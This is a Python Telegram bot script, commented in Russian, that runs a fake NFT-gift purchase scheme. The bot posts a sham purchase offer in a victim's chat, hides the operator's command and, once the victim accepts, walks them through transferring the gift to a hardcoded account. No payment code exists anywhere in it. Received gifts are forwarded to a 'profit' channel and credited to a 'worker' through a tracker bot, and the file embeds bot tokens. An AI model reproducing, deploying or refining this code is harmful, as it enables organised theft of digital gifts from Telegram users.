import asyncio
import logging
import uuid
import aiohttp

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    Message,
    CallbackQuery,
    LinkPreviewOptions,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest

# =====================================
# НАСТРОЙКИ ОФФЕР-БОТА
# =====================================
TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
TARGET_USERNAME = "rattiixx"
CURRENCY = {
    "g": "💎",
    "s": "⭐"
}

# =====================================
# НАСТРОЙКИ ТРЕКЕР-БОТА
# =====================================
TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
TRACKER_ADMIN_ID = 9158877731
PROFIT_CHANNEL_ID = -1003914079695
PROFIT_TOPIC_ID = 3

# =====================================
# ЛОКАЛИЗАЦИЯ
# =====================================
TEXTS = {
    "ru": {
        "offer_text": "Пользователь <b>{who}</b> предлагает Вам {sum} {cur} за подарок <b>{name}</b>.",
        "accepted": "🎁 <b>Подарок:</b> {name}\n\n<b>Предложение принято!</b>\n\nОжидается передача подарка.\n\nСумма предложения: {sum} {cur}",
        "btn_give": "🎁 Передать подарок",
        "btn_how": "❓ Как передать?",
        "btn_decline": "❌ Отклонить",
        "btn_accept": "✅ Принять",
        "alert_how": "Нажмите на кнопку ниже, чтобы открыть профиль получателя.\n\nЗатем нажмите на иконку подарка и выберите «Передать подарок».",
        "declined": "Вы отклонили предложение."
    },
    "en": {
        "offer_text": "User <b>{who}</b> offers You {sum} {cur} for the gift <b>{name}</b>.",
        "accepted": "🎁 <b>Gift:</b> {name}\n\n<b>Offer accepted!</b>\n\nWaiting for gift transfer.\n\nOffer amount: {sum} {cur}",
        "btn_give": "🎁 Give gift",
        "btn_how": "❓ How to give?",
        "btn_decline": "❌ Decline",
        "btn_accept": "✅ Accept",
        "alert_how": "Click the button below to open the recipient's profile.\n\nThen click on the gift icon and select 'Give Gift'.",
        "declined": "You have declined the offer."
    },
    "cn": {
        "offer_text": "用户 <b>{who}</b> 向您提供 {sum} {cur} 以换取礼物 <b>{name}</b>。",
        "accepted": "🎁 <b>礼物：</b> {name}\n\n<b>已接受！</b>\n\n等待礼物转移。\n\n出价金额：{sum} {cur}",
        "btn_give": "🎁 赠送礼物",
        "btn_how": "❓ 如何赠送？",
        "btn_decline": "❌ 拒绝",
        "btn_accept": "✅ 接受",
        "alert_how": "点击下方按钮打开接收者资料页。\n\n然后点击礼物图标并选择“赠送礼物”。",
        "declined": "您已拒绝该提议。"
    }
}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}

# =====================================
# КНОПКИ
# =====================================
def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text=t["btn_decline"], callback_data=f"dec:{oid}"),
                InlineKeyboardButton(text=t["btn_accept"], callback_data=f"acc:{oid}")
            ]
        ]
    )

def instruction_kb(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    # Ссылка ведет на профиль (карточку) пользователя
    profile_url = f"tg://resolve?domain={TARGET_USERNAME}&profile"
    
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=t["btn_give"], url=profile_url)],
            [InlineKeyboardButton(text=t["btn_how"], callback_data=f"alert_2:{lang}")]
        ]
    )

# =====================================
# КОМАНДА /OFFER
# =====================================
@dp.business_message(Command("offer"))
async def cmd_offer_business(message: Message):
    parts = message.text.split()
    
    if len(parts) < 5:
        return await message.answer(
            "Формат:\n"
            "<code>/offer https://t.me/nft/PlushPepe-2687 20 g ru</code>\n\n"
            "Языки: ru | en | cn"
        )

    url = parts[1]
    raw_sum = parts[2]
    cur_key = parts[3].lower()
    lang = parts[4].lower()

    # Автоматически добавляем https:// если пользователь забыл
    if not url.startswith("http"):
        url = "https://" + url

    if lang not in TEXTS:
        lang = "ru"

    # Проверяем, что ссылка ведет на NFT
    if not url.startswith("https://t.me/nft/"):
        return await message.answer("Ошибка: ссылка должна вести на NFT-подарок.")
    if cur_key not in CURRENCY:
        return await message.answer("Валюта только g или s.")
    if not raw_sum.isdigit() or int(raw_sum) <= 0:
        return await message.answer("Сумма должна быть положительным целым числом.")

    try:
        conn = await bot.get_business_connection(message.business_connection_id)
        worker_id = conn.user.id
    except Exception:
        worker_id = "unknown"

    oid = uuid.uuid4().hex[:12]
    raw_name = url.split("/")[-1]
    gift_name = raw_name.replace("-", " #")

    OFFERS[oid] = {
        "url": url,
        "sum": raw_sum,
        "cur": CURRENCY[cur_key],
        "name": gift_name,
        "lang": lang,
        "worker_id": worker_id
    }

    who = message.from_user.first_name if message.from_user else "User"
    t = TEXTS[lang]
    
    caption = t["offer_text"].format(
        who=who, 
        sum=raw_sum, 
        cur=CURRENCY[cur_key], 
        name=gift_name
    ) + f"\n\n{url}"

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        logging.error(f"Delete error: {e}")

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=caption,
            reply_markup=offer_kb(oid, lang),
            business_connection_id=message.business_connection_id,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
    except Exception as e:
        logging.error(f"Send error: {e}")

# =====================================
# ПРИНЯТИЕ ОФФЕРА
# =====================================
@dp.callback_query(F.data.startswith("acc:"))
async def on_accept(call: CallbackQuery):
    oid = call.data.split(":")[1]
    data = OFFERS.get(oid)

    if not data:
        return await call.answer("Оффер устарел.", show_alert=True)

    lang = data["lang"]
    t = TEXTS.get(lang, TEXTS["ru"])
    
    new_caption = t["accepted"].format(
        name=data['name'], 
        sum=data['sum'], 
        cur=data['cur']
    ) + f"\n\n{data['url']}"

    try:
        await call.message.edit_text(
            text=new_caption,
            reply_markup=instruction_kb(lang),
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after)
        try:
            await call.message.edit_text(text=new_caption, reply_markup=instruction_kb(lang))
        except Exception as error:
            logging.error(f"Retry edit error: {error}")
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            pass
        else:
            logging.error(f"Edit error: {e}")
    except Exception as e:
        logging.error(f"Edit error: {e}")

    await call.answer()

# =====================================
# ВСПЛЫВАЮЩАЯ ИНСТРУКЦИЯ
# =====================================
@dp.callback_query(F.data.startswith("alert_2:"))
async def show_alert_2(call: CallbackQuery):
    lang = call.data.split(":")[1]
    t = TEXTS.get(lang, TEXTS["ru"])
    await call.answer(t["alert_how"], show_alert=True)

# =====================================
# ОТКЛОНЕНИЕ ОФФЕРА
# =====================================
@dp.callback_query(F.data.startswith("dec:"))
async def on_decline(call: CallbackQuery):
    oid = call.data.split(":")[1]
    data = OFFERS.pop(oid, None)
    
    lang = data["lang"] if data else "ru"
    t = TEXTS.get(lang, TEXTS["ru"])

    await call.message.edit_text(text=t["declined"], reply_markup=None)
    await call.answer()

# =====================================
# ПОЛУЧЕНИЕ ПОДАРКА
# =====================================
@dp.business_message(F.gift)
async def handle_gift(message: Message):
    gift = message.gift
    if not gift:
        return

    try:
        conn = await bot.get_business_connection(message.business_connection_id)
        worker_id = conn.user.id
    except Exception:
        worker_id = "unknown"

    stars = getattr(gift, "star_count", 0) or 0
    base_name = getattr(gift, "base_name", "") or ""
    gift_id = getattr(gift, "id", "")

    try:
        await bot.forward_message(
            chat_id=PROFIT_CHANNEL_ID,
            message_thread_id=PROFIT_TOPIC_ID,
            from_chat_id=message.chat.id,
            message_id=message.message_id
        )
    except Exception as e:
        logging.error(f"Forward error: {e}")

    tracker_text = f"/add_profit {worker_id} {stars} {base_name} {gift_id}"
    tracker_url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                tracker_url,
                json={
                    "chat_id": TRACKER_ADMIN_ID,
                    "text": tracker_text
                }
            ) as resp:
                if resp.status != 200:
                    logging.error(f"Tracker error: {await resp.text()}")
    except Exception as e:
        logging.error(f"HTTP error: {e}")

# =====================================
# ЗАПУСК
# =====================================
async def main():
    print("Оффер-бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
